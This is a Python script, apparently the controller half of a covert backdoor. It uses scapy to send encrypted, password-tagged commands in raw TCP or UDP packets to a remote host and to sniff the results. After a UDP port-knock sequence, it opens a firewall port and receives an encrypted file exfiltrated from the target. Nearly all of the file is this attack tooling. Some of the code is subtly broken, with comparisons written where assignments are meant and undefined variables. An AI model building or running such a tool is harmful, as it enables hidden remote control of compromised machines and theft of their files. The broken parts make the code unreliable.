#!/usr/bin/python3
import time, os, sys, logging
import threading
from scapy.all import *
import netifaces
import encryption
import helpers
import iptablesManager

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
BUFSIZE = 1024

class Attacker(object):

    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList, ttl):
        self.localIP = lhost
        self.localPort = int(lport)
        self.listenPort = int(lisport)
        self.remoteIP = rhost
        self.remotePort = int(rport)
        self.protocol = proto.upper()

        self.password = password
        self.knockList = kList
        self.ttl = ttl
        self.state = 0

    def run(self):
        helpers.checkRootPrivilege()
        try:
            send_command_thread = threading.Thread(target=self.sendCommand)
            send_command_thread.setDaemon(True)
            send_command_thread.start()

            listen_thread = threading.Thread(target=self.listen)
            listen_thread.setDaemon(True)
            listen_thread.start()

            send_command_thread.join()
            listen_thread.join()

            while threading.active_count() > 0:
                time.sleep(0.1)

        except KeyboardInterrupt:
            print('Attacker closed...\n')
            sys.exit(0)

    def listen(self):
        mFilter = self.protocol.lower() + " src port " + str(self.remotePort) + " and dst port " + \
                str(self.localPort) + " and src host " + self.remoteIP
        print("Filter: %s" % mFilter)
        sniff(lfilter=self.isIncoming, filter=mFilter, prn=self.parsePacket)

    def sendCommand(self):
        while True:
            cmd = input(" ")
            sys.stdout.flush()
            payload = encryption.encrypt(attackerConfig.password + cmd)
            if self.protocol == 'TCP':
                packet = IP(dst=remoteIP, src=localIP)/TCP(dport=remotePort, sport=localPort)/Raw(load=payload)
            elif self.protocol == 'UDP':
                packet = IP(dst=remoteIP, src=localIP)/UDP(dport=remotePort, sport=localPort)/Raw(load=payload)

            send(packet, verbose=False)

            if cmd == 'close':
                print("Attacker closed...\n")
                os._exit(0)

    def parsePacket(self, packet):
        """
        """
        payload = packet[self.protocol].payload.load
        data = encryption.decrypt(payload)
        try:
            data = data.decode()
        except AttributeError:
            pass
        if data == "":
            return
        password = data[:8]
        result = data[8:]
        if password not in self.password:
            return
        else:
            print("Result: %s" % result)

    def isIncoming(self, packet):
        """
        Check if packets are incoming or outgoing.
        """
        # Get the default hardware interface
        defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']
        return packet[Ether].src != hardwareAddr

    def knockListener(self):
        mFilter = "udp and src host " + self.remoteIP
        sniff(filter=mFilter, prn=self.knock)

    def knockReceive(self, packet):
        if packet.haslayer(UDP):
            port = packet[UDP].dport
            if port == self.knockList[0] and self.state == 0:
                self.state == 1
                print("Knock %d" % self.state)
            elif port == self.knockList[1] and self.state == 1:
                self.state == 2
                print("Knock %d" % self.state)
            elif port == self.knockList[2] and self.state == 2:
                self.state == 3
                print("Knock %d...Openning port for receiving" % self.state)
                self.acceptRequest()
            else:
                print("Incorrect knock sequence...Reset")
                self.state = 0

    def acceptRequest(self):
        iptablesManager.openPort(self.protocol, self.remoteIP, str(self.listenPort), self.ttl)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        sock.bind((self.localIP, self.listenPort))

        sock.listen(1)
        print("Ready to receive...")
        conn, addr = sock.accept()
        print("Receive connection from {}".format(addr))

        filename = "encrypted_file.txt"
        encryptedFile = open(filename, "wb")
        while True:
            data = conn.recv(BUFSIZE)

            if data.endswith("EOF"):
                data = data[:-3]
                encryptedFile.write(data)
                break

            encryptedFile.write(data)

        encryptedFile.close()
        conn.close()

        encryption.decryptFile(filename)
        os.remove(filename)
        print("Done!")
